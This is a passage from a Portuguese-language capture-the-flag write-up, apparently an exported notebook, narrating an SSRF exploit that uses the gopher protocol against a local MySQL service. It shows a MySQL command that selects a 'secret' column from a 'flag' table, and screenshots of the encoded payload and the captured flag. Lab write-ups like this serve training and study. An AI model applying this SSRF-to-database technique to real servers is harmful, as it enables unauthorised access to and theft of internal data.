</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  <span class="ace_keyword">print</span> <span class="ace_identifier">result</span><span class="ace_paren ace_lparen">(</span><span class="ace_identifier">s</span><span class="ace_paren ace_rparen">)</span>
</div></div></div></div><div class="cell text-cell"><img src="resources/173330A158AF29F9610CE0265C3FC21F.png" alt="ssrf_encode.png" width="1319" height="163"></div><div class="cell text-cell">Vamos tentar enviar isso na aplicação e ver o que vai nos retornar:</div><div class="cell text-cell"><img src="resources/B5876985AE54BB84BAA8AB1896A3B26F.png" alt="worked.png" width="1440" height="827"></div><div class="cell text-cell">Parece que funcionou, bem, mas como já haviamos visto antes, é criado um banco de dados com uma tabela flag com uma coluna secret, então, vamos dumpar ela com o gopher…<div>Vamos mudar o nosso comando de login agora, para mysql -h 127.0.0.1 -u ssrf_user -e “use ssrf; select secret from flag"</div></div><div class="cell text-cell"><img src="resources/644B3AD6E35F64DC550045F23AAA0CCF.png" alt="ubuntu0x4.png" width="701" height="534"></div><div class="cell text-cell">Olhando neste novo pacote, a gente consegue até ver a query que será executada…<div><br></div><div>&nbsp;depois de refazer o processo inteiro em cima deste novo pacote, conseguimos enfim a flag!</div></div><div class="cell text-cell"><img src="resources/5984BAC2A827C265415FB3675C379FEA.png" alt="encode2.png" width="1319" height="197"></div><div class="cell text-cell"><img src="resources/A5B65D00B757EBF74AAB8B2AE52F7741.png" alt="lagg.png" width="1440" height="827"></div></div>
      <script></script>
